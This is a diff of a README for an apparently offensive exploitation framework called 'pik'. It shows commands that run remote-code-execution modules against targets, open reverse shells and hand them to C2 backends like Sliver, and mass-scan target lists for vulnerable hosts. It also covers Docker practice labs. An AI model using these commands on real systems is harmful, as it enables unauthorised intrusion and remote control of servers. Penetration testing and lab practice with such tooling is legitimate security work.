@@ -17,36 +17,65 @@ pik update
 ## Usage
 
 ```bash
-pik console                              # Interactive console
-pik run opendcim_sqli_rce -t target -s LHOST=ip   # Run an exploit
-pik check opendcim_sqli_rce -t target             # Check only
-pik info opendcim_sqli_rce                        # Module details + dorks
-pik build opendcim_sqli_rce -o opendcim           # Standalone binary
-pik list                                 # List all modules
-pik lab run langflow                     # Start lab + exploit (zero config)
-pik lab status                           # List running labs
+pik console                                        # Interactive console
+pik run opendcim_sqli_rce -t target -s LHOST=ip    # Run an exploit
+pik check opendcim_sqli_rce -t target              # Check only
+pik info opendcim_sqli_rce                         # Module details + dorks
+pik build opendcim_sqli_rce -o opendcim            # Standalone binary
+pik list                                           # List all modules
+pik lab run langflow_validate_code_rce             # Start lab + exploit (zero config)
+pik lab status                                     # List running labs
 ```
 
 ## Console
 
 ```
 pik > use opendcim_sqli_rce
-pik exploit/http/linux/opendcim_sqli_rce > show options
-pik exploit/http/linux/opendcim_sqli_rce > set TARGET http://target
-pik exploit/http/linux/opendcim_sqli_rce > set RPORT 8080
-pik exploit/http/linux/opendcim_sqli_rce > set LHOST 10.0.0.1
-pik exploit/http/linux/opendcim_sqli_rce > check
-pik exploit/http/linux/opendcim_sqli_rce > exploit
+pik opendcim_sqli_rce > show options
+pik opendcim_sqli_rce > set TARGET http://target
+pik opendcim_sqli_rce > set LHOST 10.0.0.1
+pik opendcim_sqli_rce > check
+pik opendcim_sqli_rce > exploit
 >> Session 1 opened (10.0.0.2:49326)
 www-data@target:~$ ^Z
 >> Session 1 backgrounded
-pik exploit/http/linux/opendcim_sqli_rce > sessions
-pik exploit/http/linux/opendcim_sqli_rce > kill 1
+pik opendcim_sqli_rce > sessions
+pik opendcim_sqli_rce > kill 1
 ```
 
 Commands: `use`, `back`, `show options|advanced|payloads|targets|modules`, `set`, `unset`, `target`, `check`, `exploit`, `lab start|stop|status|run`, `sessions`, `kill`, `search`, `info`, `resource`, `list`, `rank`, `clear`, `help`.
 
-Ctrl+Z backgrounds a session. `resource exploit.rc` runs commands from a file. History persists across sessions.
+Ctrl+Z backgrounds a session. `use <id>` selects a module by index. `resource exploit.rc` runs commands from a file. History persists across sessions.
+
+## Lab environments
+
+Modules can declare Docker lab environments. One command to go from zero to shell:
+
+```bash
+pik lab run langflow_validate_code_rce             # Start lab, wait ready, exploit, shell
+pik lab start langflow_validate_code_rce           # Just start the lab
+pik lab status                                     # List running labs
+pik lab stop langflow_validate_code_rce            # Tear down
+```
+
+The `lab run` flow: pull image, create container, wait for TCP, probe with `Check()` until the app responds, auto-detect LHOST from Docker gateway, run exploit, pop shell. Zero configuration.
+
+Labs bind to `127.0.0.1` only (never exposed to the network). Services get DNS aliases for inter-container resolution, health checks for startup ordering, and restart policies.
+
+Declaring a lab in a module:
+
+```go
+Lab: sdk.Lab{
+    Services: []sdk.Service{
+        sdk.NewLabService("db", "mysql:5.7").
+            WithEnv("MYSQL_ROOT_PASSWORD", "root").
+            WithHealthcheck("mysqladmin ping -h localhost"),
+        sdk.NewLabService("web", "wordpress:6.4", "8080:80").
+            WithEnv("WORDPRESS_DB_HOST", "db").
+            WithEnv("WORDPRESS_DB_PASSWORD", "root"),
+    },
+},
+```
 
 ## C2 backends
 
@@ -66,41 +95,11 @@ pik run opendcim_sqli_rce -t target -s LHOST=ip -s C2=httpshell -s PAYLOAD=rever
 pik run opendcim_sqli_rce -t target -s LHOST=ip -s C2=sliver -s C2CONFIG=~/.sliver/configs/operator.cfg
 ```
 
-## Lab environments
-
-Modules can declare Docker lab environments. One command to go from zero to shell:
-
-```bash
-pik lab run langflow_validate_code_rce   # Start lab, wait ready, exploit, shell
-pik lab start langflow                   # Just start the lab
-pik lab status                           # List running labs
-pik lab stop langflow                    # Tear down
-```
-
-The `lab run` flow: pull image, create container, wait for TCP, probe with Check() until the app responds, auto-detect LHOST from Docker gateway, run exploit, pop shell. Zero configuration.
-
-Labs bind to `127.0.0.1` only (never exposed to the network). Services get DNS aliases for inter-container resolution, health checks for startup ordering, and restart policies.
-
-Declaring a lab in a module:
-
-```go
-Lab: sdk.Lab{
-    Services: []sdk.Service{
-        sdk.NewLabService("db", "mysql:5.7").
-            WithEnv("MYSQL_ROOT_PASSWORD", "root").
-            WithHealthcheck("mysqladmin ping -h localhost"),
-        sdk.NewLabService("web", "wordpress:6.4", "8080:80").
-            WithEnv("WORDPRESS_DB_HOST", "db").
-            WithEnv("WORDPRESS_DB_PASSWORD", "root"),
-    },
-},
-```
-
 ## Scanning
 
 ```bash
-pik check opendcim_sqli_rce -f targets.txt -t 50 -o vulnerable.txt
-pik check opendcim_sqli_rce -f targets.txt -t 50 -o results.json --json
+pik check opendcim_sqli_rce -f targets.txt --threads 50 -o vulnerable.txt
+pik check opendcim_sqli_rce -f targets.txt --threads 50 -o results.json --json
 ```
 
 Supports HTTP/SOCKS5 proxy with `-s PROXIES=socks5://127.0.0.1:1080`.
@@ -134,7 +133,9 @@ type MyExploit struct{ sdk.Pik }
 func (m *MyExploit) Info() sdk.Info {
     return sdk.Info{
         Description: "My exploit",
-        Authors:     []sdk.Author{{Name: "you"}},
+        Authors: []sdk.Author{
+            {Name: "Your Name", Handle: "handle"},
+        },
         Reliability: sdk.Typical,
         Targets:     []sdk.Target{sdk.TargetLinux("amd64")},
     }
